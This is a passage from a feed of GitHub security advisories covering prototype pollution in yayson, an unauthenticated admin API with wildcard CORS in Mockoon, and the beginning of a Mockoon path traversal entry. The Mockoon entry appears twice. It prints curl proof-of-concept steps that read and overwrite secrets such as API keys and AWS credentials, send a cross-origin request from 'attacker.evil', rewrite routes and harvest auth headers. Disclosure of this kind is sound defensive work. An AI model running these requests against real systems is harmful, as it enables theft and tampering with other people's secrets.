<li><a href="https://www.vulncheck.com/advisories/flowise-remote-code-execution-via-overrideconfig-parameter">https://www.vulncheck.com/advisories/flowise-remote-code-execution-via-overrideconfig-parameter</a></li>
<li><a href="https://github.com/advisories/GHSA-5w6g-rc45-wvv9">https://github.com/advisories/GHSA-5w6g-rc45-wvv9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5w6g-rc45-wvv9</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-06-20T18:31:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[yayson] yayson: Prototype pollution in Store/LegacyStore deserialization]]></title>
        <id>https://github.com/advisories/GHSA-325j-mg25-8q58</id>
        <link href="https://github.com/advisories/GHSA-325j-mg25-8q58"/>
        <updated>2026-09-11T22:11:40.000Z</updated>
        <content type="html"><![CDATA[<h1 id="summary">Summary</h1>
<p><code>Store</code>/<code>LegacyStore</code> key internal lookup tables by the <code>type</code>, <code>id</code>, and relationship names from a JSON:API document. Because these were plain objects, a document with <code>type: "__proto__"</code> writes onto <code>Object.prototype</code>, polluting every object in the process.</p>
<h1 id="severity">Severity</h1>
<p>Suggested CVSS v3.1 <code>AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H</code> (8.1). The guaranteed impact is process-wide DoS / logic corruption; escalation to authorization bypass or RCE is dependent on gadgets in the consuming application.</p>
<h1 id="affected--patched">Affected / Patched</h1>
<ul>
<li>Affected: <code>&lt;= 4.2.0</code> (verified in <code>3.0.0</code> and <code>4.2.0</code>; all 3.x and 4.x).</li>
<li>Patched: <code>4.3.0</code>.</li>
</ul>
<h1 id="details">Details</h1>
<p><code>type</code> is a string <em>value</em>, untouched by <code>JSON.parse</code>, and is used directly as an object key:</p>
<pre><code class="language-js">if (!models[type]) models[type] = {}          // models["__proto__"] is Object.prototype → skipped
if (!models[type][id]) models[type][id] = model // → Object.prototype[id] = model
</code></pre>
<p>The attacker controls the polluted key (<code>id</code>) and value (the model, populated from <code>attributes</code>). Pollution persists for the process lifetime. The malicious type can also arrive via an <code>included</code> resource referenced by a relationship, bypassing any <code>data.type</code> allow-list. <code>LegacyStore</code> is additionally reachable when a configured <code>types</code> mapping resolves to <code>"__proto__"</code>.</p>
<h1 id="proof-of-concept">Proof of concept</h1>
<pre><code class="language-js">const { Store } = require('yayson')()
new Store().sync({ data: { type: '__proto__', id: 'polluted', attributes: { x: 1 } } })
console.log(({}).polluted) // { x: 1, id: 'polluted' }  ← Object.prototype polluted
</code></pre>
<h1 id="workarounds">Workarounds</h1>
<p>Reject documents whose <code>type</code> or relationship names are <code>__proto__</code>, <code>constructor</code>, or <code>prototype</code>, or run Node with <code>--disable-proto=throw</code>.</p>
<h1 id="fix">Fix</h1>
<p>Null-prototype lookup tables, rejection of <code>__proto__</code>/<code>constructor</code>/<code>prototype</code> as document-derived member names, <code>Object.keys()</code> iteration, and null-prototype normalization of caller-supplied caches.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/confetti/yayson/security/advisories/GHSA-325j-mg25-8q58">https://github.com/confetti/yayson/security/advisories/GHSA-325j-mg25-8q58</a></li>
<li><a href="https://github.com/advisories/GHSA-325j-mg25-8q58">https://github.com/advisories/GHSA-325j-mg25-8q58</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-325j-mg25-8q58</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-09-11T22:11:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@mockoon/cli] @Mockoon/commons-server: Unauthenticated admin API + wildcard CORS allows mock-state hijack and secret theft]]></title>
        <id>https://github.com/advisories/GHSA-rqx4-3f6q-3x2v</id>
        <link href="https://github.com/advisories/GHSA-rqx4-3f6q-3x2v"/>
        <updated>2026-09-11T22:04:44.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Mockoon's admin API (<a href="https://github.com/mockoon/mockoon/blob/4375a8f/packages/commons-server/src/libs/server/admin-api.ts"><code>commons-server/src/libs/server/admin-api.ts</code></a>) is mounted on the same Express listener as the user-defined mock routes, <strong>enabled by default</strong> in every shipped runtime (commons-server, CLI, serverless), serves <strong><code>Access-Control-Allow-Origin: *</code> on every endpoint with all HTTP methods allowed including PUT/POST/PATCH/DELETE/PURGE and <code>Content-Type</code> in <code>Access-Control-Allow-Headers</code></strong>, and has <strong>zero authentication of any kind</strong> (no token, no shared secret, no <code>MOCKOON_ADMIN_TOKEN</code> env var — searched the repo, returns zero hits).</p>
<p>Any unauthenticated caller who can reach the mock server's port (default <code>0.0.0.0:3000</code>) can:</p>
<ul>
<li>Read every <code>MOCKOON_*</code> env var used by the operator as secret material in templates (<code>getEnvVar</code> helper).</li>
<li><strong>Write arbitrary process env vars (no prefix check on the WRITE path)</strong> — poison operator's <code>MOCKOON_API_KEY</code>, <code>MOCKOON_JWT_SECRET</code>, …, or write process-level vars like <code>AWS_SECRET_ACCESS_KEY</code> that the surrounding runtime consumes.</li>
<li><strong>Rewrite every mock route's body / status / headers in-runtime</strong> via <code>PUT /mockoon-admin/environment</code> — downstream consumers (frontend dev-server, CI test suite, integration partner) receive attacker-controlled responses and headers including <code>Set-Cookie</code>, <code>Location</code>, <code>Content-Security-Policy</code>, etc.</li>
<li>Read transaction logs / SSE stream (consumer's request bodies + auth headers in clear).</li>
<li>Read/write global template vars; purge state / data buckets / logs.</li>
</ul>
<p>Because of the wildcard CORS reply, the attack <strong>also lands cross-origin from a browser</strong>: a developer who runs <code>mockoon-cli start ...</code> locally and visits a malicious website gets their mock state hijacked.</p>
<hr>
<h2 id="details">Details</h2>
<h3 id="root-cause">Root cause</h3>
<p><code>packages/commons-server/src/libs/server/server.ts:127</code>:</p>
<pre><code class="language-ts">private options: ServerOptions = {
  ...,
  enableAdminApi: true,        // ← default on
};
</code></pre>
<p><code>packages/cli/src/commands/start.ts:200</code>:</p>
<pre><code class="language-ts">enableAdminApi: !userFlags['disable-admin-api'],   // default true unless --disable-admin-api passed
</code></pre>
<p><code>packages/serverless/src/libs/serverless.ts:21</code>:</p>
<pre><code class="language-ts">enableAdminApi: true,          // ← default on, no flag to disable in the constructor
</code></pre>
<p><code>packages/commons-server/src/libs/server/admin-api.ts:63-74</code> (permissive CORS on every admin endpoint):</p>
<pre><code class="language-ts">app.use(`${adminApiPrefix}*`, (req, res, next) =&gt; {
  res.setHeaders(
    new Headers({
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods':
        'GET,POST,PUT,PATCH,DELETE,HEAD,OPTIONS',
      'Access-Control-Allow-Headers':
        'Content-Type, Origin, Accept, Authorization, Content-Length, X-Requested-With'
    })
  );
  next();
});
</code></pre>
<p><code>packages/commons-server/src/libs/server/admin-api.ts:151-166</code> (no auth, no prefix check on WRITE):</p>
<pre><code class="language-ts">const setEnvVarHandler = (req, res) =&gt; {
  try {
    const { key, value } = req.body;
    if (key !== undefined &amp;&amp; value !== undefined) {
      process.env[key] = value;                            // ← any process env, any value
      res.send({ message: `Environment variable '${key}' has been set to '${value}'` });
    } else {
      throw new Error('Key or value missing from request');
    }
  } catch (_error) {
    res.status(400).send({ message: 'Invalid request' });
  }
};
</code></pre>
<p><code>packages/commons-server/src/libs/server/admin-api.ts:373-393</code> (the most impactful — runtime mock rewrite):</p>
<pre><code class="language-ts">app.put(`${adminApiPrefix}/environment`, (req, res) =&gt; {
  try {
    const environment: Environment = EnvironmentSchema.validate(req.body).value;
    if (!environment) {
      res.status(400).send({ message: 'Invalid environment format' });
      return;
    }
    updateEnvironment(environment);                        // ← runtime mutation of every route response
    res.send({ message: 'Environment updated' });
  } catch (_error) {
    res.status(400).send({ message: 'Invalid environment format' });
  }
});
</code></pre>
<p>Default <code>hostname: ''</code> (<code>packages/commons/src/constants/environment-schema.constants.ts:33</code>) → Node binds <code>0.0.0.0</code>/<code>::</code> (confirmed via <code>lsof</code>). Migration #16 (<code>packages/commons/src/libs/migrations.ts:343</code>) also forces missing hostnames to <code>'0.0.0.0'</code>.</p>
<hr>
<h2 id="poc">PoC</h2>
<h3 id="live-reproduction-2026-05-11-mockooncli961">Live reproduction (2026-05-11, <code>@mockoon/cli@9.6.1</code>)</h3>
<p><code>npm install @mockoon/cli@9.6.1</code>. Minimal <code>env.json</code> with one route <code>GET /users/:id</code> whose response templates <code>{{getEnvVar 'MOCKOON_API_KEY'}}</code>. Start with:</p>
<pre><code>MOCKOON_API_KEY="sk-operator-real-secret-DO_NOT_LEAK_xyz789" \
  mockoon-cli start --data env.json --port 3100 --repair --disable-log-to-file
</code></pre>
<p>Bind confirmed via <code>lsof</code>:</p>
<pre><code>COMMAND  PID    USER  FD  TYPE  ...  NAME
node    39906  ...   14u  IPv6  ...  TCP *:3100 (LISTEN)    &lt;-- all interfaces
</code></pre>
<p>Baseline mock response:</p>
<pre><code>$ curl -s http://127.0.0.1:3100/users/42
{"id":"42","name":"BENIGN_ALICE","role":"user","apiKey":"sk-operator-real-secret-DO_NOT_LEAK_xyz789"}
</code></pre>
<h4 id="1-read-operator-secret-unauth">1) Read operator secret unauth</h4>
<pre><code>$ curl -s -i http://127.0.0.1:3100/mockoon-admin/env-vars/API_KEY
HTTP/1.1 200 OK
access-control-allow-origin: *
{"key":"MOCKOON_API_KEY","value":"sk-operator-real-secret-DO_NOT_LEAK_xyz789"}
</code></pre>
<h4 id="2-poison-operator-secret-unauth-→-downstream-consumer-ingests-attacker-value">2) Poison operator secret unauth → downstream consumer ingests attacker value</h4>
<pre><code>$ curl -s -X POST http://127.0.0.1:3100/mockoon-admin/env-vars \
    -H "Content-Type: application/json" \
    -d '{"key":"MOCKOON_API_KEY","value":"sk-POISONED-BY-ATTACKER"}'
{"message":"Environment variable 'MOCKOON_API_KEY' has been set to 'sk-POISONED-BY-ATTACKER'"}

$ curl -s http://127.0.0.1:3100/users/42
{"id":"42","name":"BENIGN_ALICE","role":"user","apiKey":"sk-POISONED-BY-ATTACKER"}
</code></pre>
<h4 id="3-write-arbitrary-non-mockoon_-env-var-no-prefix-gate">3) Write arbitrary non-<code>MOCKOON_*</code> env var (no prefix gate)</h4>
<pre><code>$ curl -s -X POST http://127.0.0.1:3100/mockoon-admin/env-vars \
    -H "Content-Type: application/json" \
    -d '{"key":"AWS_SECRET_ACCESS_KEY","value":"overwritten-by-attacker"}'
{"message":"Environment variable 'AWS_SECRET_ACCESS_KEY' has been set to 'overwritten-by-attacker'"}
</code></pre>
<h4 id="4-cross-origin-csrf-from-httpsattackerevil">4) Cross-origin CSRF from <code>https://attacker.evil</code></h4>
<pre><code>$ curl -s -i -X OPTIONS http://127.0.0.1:3100/mockoon-admin/env-vars \
    -H "Origin: https://attacker.evil" \
    -H "Access-Control-Request-Method: POST" \
    -H "Access-Control-Request-Headers: Content-Type"
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET,POST,PUT,PATCH,DELETE,HEAD,OPTIONS
Access-Control-Allow-Headers: Content-Type, Origin, Accept, Authorization, Content-Length, X-Requested-With

$ curl -s -X POST http://127.0.0.1:3100/mockoon-admin/env-vars \
    -H "Origin: https://attacker.evil" \
    -H "Content-Type: application/json" \
    -d '{"key":"MOCKOON_API_KEY","value":"sk-EXFIL-FROM-attacker.evil"}'
{"message":"Environment variable 'MOCKOON_API_KEY' has been set to 'sk-EXFIL-FROM-attacker.evil'"}
</code></pre>
<p>Wildcard <code>Access-Control-Allow-Origin: *</code> + <code>Access-Control-Allow-Methods</code> covering PUT/POST/PATCH + <code>Content-Type</code> in <code>Access-Control-Allow-Headers</code> mean the browser preflight passes for non-simple JSON POSTs. A developer who visits a malicious site while their Mockoon CLI is running is fully exploitable from JavaScript.</p>
<h4 id="5-rewrite-every-mock-route-via-unauth-put-environment">5) Rewrite every mock route via unauth <code>PUT /environment</code></h4>
<pre><code>$ curl -s -X PUT http://127.0.0.1:3100/mockoon-admin/environment \
    -H "Origin: https://attacker.evil" \
    -H "Content-Type: application/json" \
    -d '{ ...full env JSON with route response rewritten to body "ATTACKER_PWNED",
          statusCode 418, header X-Pwned: by-attacker.evil... }'
{"message":"Environment updated"}

$ curl -s -i http://127.0.0.1:3100/users/99
HTTP/1.1 418 I'm a Teapot
X-Pwned: by-attacker.evil
Content-Type: application/json
{"id":"99","name":"ATTACKER_PWNED","role":"admin","backdoor":true}
</code></pre>
<h4 id="6-read-transaction-logs--sse-stream-→-harvest-consumers-auth-headers">6) Read transaction logs / SSE stream → harvest consumer's auth headers</h4>
<pre><code>$ curl -s http://127.0.0.1:3100/mockoon-admin/logs?limit=2
</code></pre>
<p>Each log entry includes consumer's <code>request.headers</code> (Authorization / Cookie / X-API-Key), <code>request.body</code>, <code>request.urlPath</code>, and the response served back — continuous info-disclosure of every API call the legitimate consumer makes against the mock. <code>GET /mockoon-admin/events</code> streams the same data live via SSE.</p>
<h4 id="7-purge-state-dos">7) Purge state (DoS)</h4>
<pre><code>$ curl -s -X POST http://127.0.0.1:3100/mockoon-admin/state/purge
{"response":"Server has been reset to its initial state"}
</code></pre>
<hr>
<h2 id="impact">Impact</h2>
<p>In typical local-dev mode (CVSS 8.8 High):</p>
<ul>
<li>Secret read of every <code>MOCKOON_*</code> env var (API keys, JWT signing keys, OAuth client secrets).</li>
<li>Secret write to any <code>process.env</code> key — poison operator's secrets, swap AWS/SDK creds.</li>
<li>Runtime rewrite of every mock route's body / status / headers → downstream consumer ingests attacker-controlled data + headers (Set-Cookie, Location, CSP).</li>
<li>Auth-token harvesting via transaction logs / SSE stream.</li>
<li>State purge / DoS.</li>
</ul>
<p>In network-exposed deployment (CVSS 9.4 Critical):</p>
<ul>
<li>All of the above without user interaction. The serverless wrapper hardcodes <code>enableAdminApi: true</code>; <code>mockoon/cli</code> Docker image inherits the same default and is commonly deployed in shared CI / staging environments.</li>
</ul>
<hr>
<h2 id="suggested-fix">Suggested fix</h2>
<ol>
<li>Require explicit authentication on the admin API by default. Print an auto-generated bearer token on CLI startup (Jupyter-style), keyed off <code>MOCKOON_ADMIN_TOKEN</code> env var, compared with <code>crypto.timingSafeEqual</code>.</li>
<li>Stop sending <code>Access-Control-Allow-Origin: *</code> on admin endpoints. Default: no CORS at all (browser will block cross-origin reads). Operators who run a separate admin UI on another origin can opt-in with <code>--admin-api-origin</code>.</li>
<li>Bind the admin API to loopback by default, on a separate port or behind a remote-address check.</li>
<li>Add a prefix check on the <code>setEnvVarHandler</code> matching the prepend behavior on the GET handler — reject any <code>key</code> that doesn't start with <code>envVarsPrefix</code>.</li>
<li>Add <code>SECURITY.md</code> with disclosure instructions.</li>
<li>Ship <code>@mockoon/serverless</code> and <code>mockoon/cli</code> Docker image with <code>enableAdminApi: false</code> by default; opt-in via flag.</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mockoon/mockoon/security/advisories/GHSA-rqx4-3f6q-3x2v">https://github.com/mockoon/mockoon/security/advisories/GHSA-rqx4-3f6q-3x2v</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59148">https://nvd.nist.gov/vuln/detail/CVE-2026-59148</a></li>
<li><a href="https://github.com/mockoon/mockoon/pull/2254">https://github.com/mockoon/mockoon/pull/2254</a></li>
<li><a href="https://github.com/mockoon/mockoon/commit/c420b5a56918475b8663977b51e5f986e45b3299">https://github.com/mockoon/mockoon/commit/c420b5a56918475b8663977b51e5f986e45b3299</a></li>
<li><a href="https://github.com/mockoon/mockoon/releases/tag/v9.7.0">https://github.com/mockoon/mockoon/releases/tag/v9.7.0</a></li>
<li><a href="https://mockoon.com/releases/9.7.0">https://mockoon.com/releases/9.7.0</a></li>
<li><a href="https://github.com/advisories/GHSA-rqx4-3f6q-3x2v">https://github.com/advisories/GHSA-rqx4-3f6q-3x2v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rqx4-3f6q-3x2v</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-11T22:04:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@mockoon/commons-server] @Mockoon/commons-server: Unauthenticated admin API + wildcard CORS allows mock-state hijack and secret theft]]></title>
        <id>https://github.com/advisories/GHSA-rqx4-3f6q-3x2v</id>
        <link href="https://github.com/advisories/GHSA-rqx4-3f6q-3x2v"/>
        <updated>2026-09-11T22:04:44.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Mockoon's admin API (<a href="https://github.com/mockoon/mockoon/blob/4375a8f/packages/commons-server/src/libs/server/admin-api.ts"><code>commons-server/src/libs/server/admin-api.ts</code></a>) is mounted on the same Express listener as the user-defined mock routes, <strong>enabled by default</strong> in every shipped runtime (commons-server, CLI, serverless), serves <strong><code>Access-Control-Allow-Origin: *</code> on every endpoint with all HTTP methods allowed including PUT/POST/PATCH/DELETE/PURGE and <code>Content-Type</code> in <code>Access-Control-Allow-Headers</code></strong>, and has <strong>zero authentication of any kind</strong> (no token, no shared secret, no <code>MOCKOON_ADMIN_TOKEN</code> env var — searched the repo, returns zero hits).</p>
<p>Any unauthenticated caller who can reach the mock server's port (default <code>0.0.0.0:3000</code>) can:</p>
<ul>
<li>Read every <code>MOCKOON_*</code> env var used by the operator as secret material in templates (<code>getEnvVar</code> helper).</li>
<li><strong>Write arbitrary process env vars (no prefix check on the WRITE path)</strong> — poison operator's <code>MOCKOON_API_KEY</code>, <code>MOCKOON_JWT_SECRET</code>, …, or write process-level vars like <code>AWS_SECRET_ACCESS_KEY</code> that the surrounding runtime consumes.</li>
<li><strong>Rewrite every mock route's body / status / headers in-runtime</strong> via <code>PUT /mockoon-admin/environment</code> — downstream consumers (frontend dev-server, CI test suite, integration partner) receive attacker-controlled responses and headers including <code>Set-Cookie</code>, <code>Location</code>, <code>Content-Security-Policy</code>, etc.</li>
<li>Read transaction logs / SSE stream (consumer's request bodies + auth headers in clear).</li>
<li>Read/write global template vars; purge state / data buckets / logs.</li>
</ul>
<p>Because of the wildcard CORS reply, the attack <strong>also lands cross-origin from a browser</strong>: a developer who runs <code>mockoon-cli start ...</code> locally and visits a malicious website gets their mock state hijacked.</p>
<hr>
<h2 id="details">Details</h2>
<h3 id="root-cause">Root cause</h3>
<p><code>packages/commons-server/src/libs/server/server.ts:127</code>:</p>
<pre><code class="language-ts">private options: ServerOptions = {
  ...,
  enableAdminApi: true,        // ← default on
};
</code></pre>
<p><code>packages/cli/src/commands/start.ts:200</code>:</p>
<pre><code class="language-ts">enableAdminApi: !userFlags['disable-admin-api'],   // default true unless --disable-admin-api passed
</code></pre>
<p><code>packages/serverless/src/libs/serverless.ts:21</code>:</p>
<pre><code class="language-ts">enableAdminApi: true,          // ← default on, no flag to disable in the constructor
</code></pre>
<p><code>packages/commons-server/src/libs/server/admin-api.ts:63-74</code> (permissive CORS on every admin endpoint):</p>
<pre><code class="language-ts">app.use(`${adminApiPrefix}*`, (req, res, next) =&gt; {
  res.setHeaders(
    new Headers({
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods':
        'GET,POST,PUT,PATCH,DELETE,HEAD,OPTIONS',
      'Access-Control-Allow-Headers':
        'Content-Type, Origin, Accept, Authorization, Content-Length, X-Requested-With'
    })
  );
  next();
});
</code></pre>
<p><code>packages/commons-server/src/libs/server/admin-api.ts:151-166</code> (no auth, no prefix check on WRITE):</p>
<pre><code class="language-ts">const setEnvVarHandler = (req, res) =&gt; {
  try {
    const { key, value } = req.body;
    if (key !== undefined &amp;&amp; value !== undefined) {
      process.env[key] = value;                            // ← any process env, any value
      res.send({ message: `Environment variable '${key}' has been set to '${value}'` });
    } else {
      throw new Error('Key or value missing from request');
    }
  } catch (_error) {
    res.status(400).send({ message: 'Invalid request' });
  }
};
</code></pre>
<p><code>packages/commons-server/src/libs/server/admin-api.ts:373-393</code> (the most impactful — runtime mock rewrite):</p>
<pre><code class="language-ts">app.put(`${adminApiPrefix}/environment`, (req, res) =&gt; {
  try {
    const environment: Environment = EnvironmentSchema.validate(req.body).value;
    if (!environment) {
      res.status(400).send({ message: 'Invalid environment format' });
      return;
    }
    updateEnvironment(environment);                        // ← runtime mutation of every route response
    res.send({ message: 'Environment updated' });
  } catch (_error) {
    res.status(400).send({ message: 'Invalid environment format' });
  }
});
</code></pre>
<p>Default <code>hostname: ''</code> (<code>packages/commons/src/constants/environment-schema.constants.ts:33</code>) → Node binds <code>0.0.0.0</code>/<code>::</code> (confirmed via <code>lsof</code>). Migration #16 (<code>packages/commons/src/libs/migrations.ts:343</code>) also forces missing hostnames to <code>'0.0.0.0'</code>.</p>
<hr>
<h2 id="poc">PoC</h2>
<h3 id="live-reproduction-2026-05-11-mockooncli961">Live reproduction (2026-05-11, <code>@mockoon/cli@9.6.1</code>)</h3>
<p><code>npm install @mockoon/cli@9.6.1</code>. Minimal <code>env.json</code> with one route <code>GET /users/:id</code> whose response templates <code>{{getEnvVar 'MOCKOON_API_KEY'}}</code>. Start with:</p>
<pre><code>MOCKOON_API_KEY="sk-operator-real-secret-DO_NOT_LEAK_xyz789" \
  mockoon-cli start --data env.json --port 3100 --repair --disable-log-to-file
</code></pre>
<p>Bind confirmed via <code>lsof</code>:</p>
<pre><code>COMMAND  PID    USER  FD  TYPE  ...  NAME
node    39906  ...   14u  IPv6  ...  TCP *:3100 (LISTEN)    &lt;-- all interfaces
</code></pre>
<p>Baseline mock response:</p>
<pre><code>$ curl -s http://127.0.0.1:3100/users/42
{"id":"42","name":"BENIGN_ALICE","role":"user","apiKey":"sk-operator-real-secret-DO_NOT_LEAK_xyz789"}
</code></pre>
<h4 id="1-read-operator-secret-unauth">1) Read operator secret unauth</h4>
<pre><code>$ curl -s -i http://127.0.0.1:3100/mockoon-admin/env-vars/API_KEY
HTTP/1.1 200 OK
access-control-allow-origin: *
{"key":"MOCKOON_API_KEY","value":"sk-operator-real-secret-DO_NOT_LEAK_xyz789"}
</code></pre>
<h4 id="2-poison-operator-secret-unauth-→-downstream-consumer-ingests-attacker-value">2) Poison operator secret unauth → downstream consumer ingests attacker value</h4>
<pre><code>$ curl -s -X POST http://127.0.0.1:3100/mockoon-admin/env-vars \
    -H "Content-Type: application/json" \
    -d '{"key":"MOCKOON_API_KEY","value":"sk-POISONED-BY-ATTACKER"}'
{"message":"Environment variable 'MOCKOON_API_KEY' has been set to 'sk-POISONED-BY-ATTACKER'"}

$ curl -s http://127.0.0.1:3100/users/42
{"id":"42","name":"BENIGN_ALICE","role":"user","apiKey":"sk-POISONED-BY-ATTACKER"}
</code></pre>
<h4 id="3-write-arbitrary-non-mockoon_-env-var-no-prefix-gate">3) Write arbitrary non-<code>MOCKOON_*</code> env var (no prefix gate)</h4>
<pre><code>$ curl -s -X POST http://127.0.0.1:3100/mockoon-admin/env-vars \
    -H "Content-Type: application/json" \
    -d '{"key":"AWS_SECRET_ACCESS_KEY","value":"overwritten-by-attacker"}'
{"message":"Environment variable 'AWS_SECRET_ACCESS_KEY' has been set to 'overwritten-by-attacker'"}
</code></pre>
<h4 id="4-cross-origin-csrf-from-httpsattackerevil">4) Cross-origin CSRF from <code>https://attacker.evil</code></h4>
<pre><code>$ curl -s -i -X OPTIONS http://127.0.0.1:3100/mockoon-admin/env-vars \
    -H "Origin: https://attacker.evil" \
    -H "Access-Control-Request-Method: POST" \
    -H "Access-Control-Request-Headers: Content-Type"
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET,POST,PUT,PATCH,DELETE,HEAD,OPTIONS
Access-Control-Allow-Headers: Content-Type, Origin, Accept, Authorization, Content-Length, X-Requested-With

$ curl -s -X POST http://127.0.0.1:3100/mockoon-admin/env-vars \
    -H "Origin: https://attacker.evil" \
    -H "Content-Type: application/json" \
    -d '{"key":"MOCKOON_API_KEY","value":"sk-EXFIL-FROM-attacker.evil"}'
{"message":"Environment variable 'MOCKOON_API_KEY' has been set to 'sk-EXFIL-FROM-attacker.evil'"}
</code></pre>
<p>Wildcard <code>Access-Control-Allow-Origin: *</code> + <code>Access-Control-Allow-Methods</code> covering PUT/POST/PATCH + <code>Content-Type</code> in <code>Access-Control-Allow-Headers</code> mean the browser preflight passes for non-simple JSON POSTs. A developer who visits a malicious site while their Mockoon CLI is running is fully exploitable from JavaScript.</p>
<h4 id="5-rewrite-every-mock-route-via-unauth-put-environment">5) Rewrite every mock route via unauth <code>PUT /environment</code></h4>
<pre><code>$ curl -s -X PUT http://127.0.0.1:3100/mockoon-admin/environment \
    -H "Origin: https://attacker.evil" \
    -H "Content-Type: application/json" \
    -d '{ ...full env JSON with route response rewritten to body "ATTACKER_PWNED",
          statusCode 418, header X-Pwned: by-attacker.evil... }'
{"message":"Environment updated"}

$ curl -s -i http://127.0.0.1:3100/users/99
HTTP/1.1 418 I'm a Teapot
X-Pwned: by-attacker.evil
Content-Type: application/json
{"id":"99","name":"ATTACKER_PWNED","role":"admin","backdoor":true}
</code></pre>
<h4 id="6-read-transaction-logs--sse-stream-→-harvest-consumers-auth-headers">6) Read transaction logs / SSE stream → harvest consumer's auth headers</h4>
<pre><code>$ curl -s http://127.0.0.1:3100/mockoon-admin/logs?limit=2
</code></pre>
<p>Each log entry includes consumer's <code>request.headers</code> (Authorization / Cookie / X-API-Key), <code>request.body</code>, <code>request.urlPath</code>, and the response served back — continuous info-disclosure of every API call the legitimate consumer makes against the mock. <code>GET /mockoon-admin/events</code> streams the same data live via SSE.</p>
<h4 id="7-purge-state-dos">7) Purge state (DoS)</h4>
<pre><code>$ curl -s -X POST http://127.0.0.1:3100/mockoon-admin/state/purge
{"response":"Server has been reset to its initial state"}
</code></pre>
<hr>
<h2 id="impact">Impact</h2>
<p>In typical local-dev mode (CVSS 8.8 High):</p>
<ul>
<li>Secret read of every <code>MOCKOON_*</code> env var (API keys, JWT signing keys, OAuth client secrets).</li>
<li>Secret write to any <code>process.env</code> key — poison operator's secrets, swap AWS/SDK creds.</li>
<li>Runtime rewrite of every mock route's body / status / headers → downstream consumer ingests attacker-controlled data + headers (Set-Cookie, Location, CSP).</li>
<li>Auth-token harvesting via transaction logs / SSE stream.</li>
<li>State purge / DoS.</li>
</ul>
<p>In network-exposed deployment (CVSS 9.4 Critical):</p>
<ul>
<li>All of the above without user interaction. The serverless wrapper hardcodes <code>enableAdminApi: true</code>; <code>mockoon/cli</code> Docker image inherits the same default and is commonly deployed in shared CI / staging environments.</li>
</ul>
<hr>
<h2 id="suggested-fix">Suggested fix</h2>
<ol>
<li>Require explicit authentication on the admin API by default. Print an auto-generated bearer token on CLI startup (Jupyter-style), keyed off <code>MOCKOON_ADMIN_TOKEN</code> env var, compared with <code>crypto.timingSafeEqual</code>.</li>
<li>Stop sending <code>Access-Control-Allow-Origin: *</code> on admin endpoints. Default: no CORS at all (browser will block cross-origin reads). Operators who run a separate admin UI on another origin can opt-in with <code>--admin-api-origin</code>.</li>
<li>Bind the admin API to loopback by default, on a separate port or behind a remote-address check.</li>
<li>Add a prefix check on the <code>setEnvVarHandler</code> matching the prepend behavior on the GET handler — reject any <code>key</code> that doesn't start with <code>envVarsPrefix</code>.</li>
<li>Add <code>SECURITY.md</code> with disclosure instructions.</li>
<li>Ship <code>@mockoon/serverless</code> and <code>mockoon/cli</code> Docker image with <code>enableAdminApi: false</code> by default; opt-in via flag.</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mockoon/mockoon/security/advisories/GHSA-rqx4-3f6q-3x2v">https://github.com/mockoon/mockoon/security/advisories/GHSA-rqx4-3f6q-3x2v</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59148">https://nvd.nist.gov/vuln/detail/CVE-2026-59148</a></li>
<li><a href="https://github.com/mockoon/mockoon/pull/2254">https://github.com/mockoon/mockoon/pull/2254</a></li>
<li><a href="https://github.com/mockoon/mockoon/commit/c420b5a56918475b8663977b51e5f986e45b3299">https://github.com/mockoon/mockoon/commit/c420b5a56918475b8663977b51e5f986e45b3299</a></li>
<li><a href="https://github.com/mockoon/mockoon/releases/tag/v9.7.0">https://github.com/mockoon/mockoon/releases/tag/v9.7.0</a></li>
<li><a href="https://mockoon.com/releases/9.7.0">https://mockoon.com/releases/9.7.0</a></li>
<li><a href="https://github.com/advisories/GHSA-rqx4-3f6q-3x2v">https://github.com/advisories/GHSA-rqx4-3f6q-3x2v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rqx4-3f6q-3x2v</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-11T22:04:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@mockoon/cli] @Mockoon/commons-server: Path traversal in templated `filePath` lets a request escape the served directory (prefix-only base check)]]></title>
        <id>https://github.com/advisories/GHSA-8wqc-v2q8-vff2</id>
        <link href="https://github.com/advisories/GHSA-8wqc-v2q8-vff2"/>
        <updated>2026-09-11T22:04:34.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>A <code>FILE</code> response whose <code>filePath</code> embeds request data (e.g. <code>"/srv/public/{{queryParam 'name'}}"</code>, the documented way to let the client pick a file) is confined by <code>getSafeFilePath</code> with <code>resolvedPath.startsWith(staticBaseDir)</code>. That prefix test has no path-separator boundary, so a <code>../</code>-escaped path whose absolute form string-prefixes the base directory passes. An unauthenticated client reads files from sibling paths outside the served directory.</p>
<h2 id="details">Details</h2>
